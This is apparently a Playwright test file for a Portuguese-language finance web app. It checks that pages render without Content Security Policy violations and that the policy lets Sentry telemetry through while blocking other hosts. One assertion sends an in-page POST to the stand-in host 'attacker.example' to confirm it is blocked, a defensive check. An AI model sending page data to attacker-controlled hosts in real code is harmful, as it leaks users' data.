import { expect, test } from "@playwright/test";

import { requireServer } from "./server";

test("pages and the API docs render without Content Security Policy violations (SOL-134)", async ({
  page,
  request,
}) => {
  await requireServer(request);
  const violations: string[] = [];
  page.on("console", (message) => {
    if (message.text().includes("Content Security Policy")) violations.push(message.text());
  });
  const api = page.request;
  await api.post("/api/auth/sign-up", {
    data: { email: `e2e-csp-${Date.now()}@example.com`, password: "uma-senha-bem-longa" },
  });
  await api.post("/api/onboarding", { data: { opening_balance: "1000.00", opening_date: "2026-01-01" } });
  await api.post("/api/me/tour-seen");

  for (const path of ["/entrar", "/mes", "/ajustes/categorias", "/para-onde-vai"]) {
    await page.goto(path);
    await expect(page.locator("main").first()).toBeVisible();
  }
  await page.goto("/api/docs/");
  await expect(page.getByText("soldi").first()).toBeVisible();

  expect(violations).toEqual([]);
});

test("the policy lets Sentry ingest through and blocks other hosts (SOL-134)", async ({ page, request }) => {
  await requireServer(request);
  await page.route("https://**/api/1/envelope/", (route) =>
    route.fulfill({ status: 200, headers: { "access-control-allow-origin": "*" }, body: "{}" }),
  );
  const violations: string[] = [];
  page.on("console", (message) => {
    if (message.text().includes("Content Security Policy")) violations.push(message.text());
  });
  await page.goto("/entrar");

  const reach = (url: string) =>
    page.evaluate(
      (target) =>
        fetch(target, { method: "POST", body: "{}" }).then(
          () => "sent",
          () => "blocked",
        ),
      url,
    );

  expect(await reach("https://o1.ingest.us.sentry.io/api/1/envelope/")).toBe("sent");
  expect(await reach("https://o1.ingest.sentry.io/api/1/envelope/")).toBe("sent");
  expect(await reach("https://attacker.example/api/1/envelope/")).toBe("blocked");
  await expect.poll(() => violations.join()).toContain("attacker.example");
});
